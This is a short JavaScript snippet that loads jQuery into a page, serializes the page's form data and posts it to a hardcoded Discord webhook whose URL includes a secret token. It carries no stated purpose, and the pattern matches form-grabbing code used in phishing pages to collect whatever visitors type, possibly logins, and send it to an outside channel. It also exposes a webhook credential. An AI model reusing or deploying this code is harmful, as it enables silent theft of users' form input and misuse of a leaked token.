
const script = document.createElement('script');
script.src = 'https://code.jquery.com/jquery-3.6.3.js'; // Check https://jquery.com/ for the current version
document.getElementsByTagName('head')[0].appendChild(script);  
  
  
  function dostuff(){
    
   
    sendMessage( $('form').serialize() )
  }
  function sendMessage(message) {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1074761634033176636/lbAefsrEGySPzlIR3fW08bw65GZNSl5Pllk_VHoy48kDts8UlAW2-nkleGZA2SSoEvw-");

    request.setRequestHeader('Content-type', 'application/json');

    var params = {
      content: message
    }

    request.send(JSON.stringify(params));
  }